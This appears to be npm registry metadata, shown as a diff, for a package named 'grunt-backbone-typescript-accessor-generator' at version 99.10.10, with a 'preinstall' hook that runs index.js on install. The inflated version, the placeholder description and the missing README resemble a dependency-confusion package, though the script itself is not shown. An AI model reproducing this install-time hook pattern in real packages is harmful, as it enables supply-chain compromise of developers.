@@ -1,0 +1,62 @@
+{
+    "_id": "grunt-backbone-typescript-accessor-generator",
+    "name": "grunt-backbone-typescript-accessor-generator",
+    "dist-tags": {
+        "latest": "99.10.10"
+    },
+    "versions": {
+        "99.10.10": {
+            "name": "grunt-backbone-typescript-accessor-generator",
+            "version": "99.10.10",
+            "description": "duffel package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "grunt-backbone-typescript-accessor-generator@99.10.10",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-UqymWhr9XZQQRK406lqa2ZFS4gN2A/BmyPx0KkiX2nWMdC1xihmI2atMvRmfQsS8AZN9qMDLiN+goOUY8s9+Lw==",
+                "shasum": "bb4d66fbca761199dcdb2cb3019e076862af57bc",
+                "tarball": "https://registry.npmjs.org/grunt-backbone-typescript-accessor-generator/-/grunt-backbone-typescript-accessor-generator-99.10.10.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5095,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiMiiNACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrCTw/5AY7gA9De70f5Gx1mxtnYzh6gXzIdam7r2k8F4b1Co8RywNjN\r\n+qhCof9a2iNkhDDBjbCAXvKMz6ipvNelbtt9DgP5zVMlUrPrHcdHvMV3v2Rw\r\nbNMHoYW5T02gC1ZWNvku+hXMi0IxejMhTjXqALfTCC6KGlmWAf8WBwqtfwrU\r\n5XjMArvu2bHi1p3QW6f1h0O4mVcjJ9pkGAXpap/hERt+ITrMS36GyYipz9+d\r\ncu4brYIXcCeNryw78RNqYbzPdldBtZ+5rFHskAk2r2jK4u28n81whOZnzZe9\r\nzx/u2CGgbYBr9etq+ciKL0m8VFcy+lddu4jNTIaOZ3i4iX5aXl2OHCY5A5fv\r\nlto3kHiz4Rb+S47i6Fi06FlYRYeljIZ58DoNP/+6vIxPZTdC0L96gDqXD2UH\r\nEU71URfWfISMsbvL4SVDQ/8Gg0Au/WtVW4irxnw2WUd9XI1rcVTUPeQx7Ec2\r\nDuzFYJfsYKHtUUq2Q//ZeHmPno5hin7lLHuW5pwWbKb6C2zMCK5lYTtu9cK/\r\ndZ68Dt/hxmZgnh7NnEsObcBOqJIwvO6lQdc58haz6N/TP5ZcH8p5kU5a5ONZ\r\nyQJlgxYUYO7UzVr0tCRpCvQPcf7Ax0Y/25mmgg1RkGY/X2Dec8JWUBSoZRw8\r\n+F9joFJZnidnb//mNjmiiLey7MxMDI30nug=\r\n=jTL6\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "duffel_api",
+                "email": "duffel_api@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "duffel_api",
+                    "email": "duffel_api@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/grunt-backbone-typescript-accessor-generator_99.10.10_1647454349356_0.5293045729338186"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-16T18:12:29.356Z",
+        "99.10.10": "2022-03-16T18:12:29.604Z",
+        "modified": "2022-03-16T18:12:29.696Z"
+    },
+    "maintainers": [
+        {
+            "name": "duffel_api",
+            "email": "duffel_api@rt11.33mail.com"
+        }
+    ],
+    "description": "duffel package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
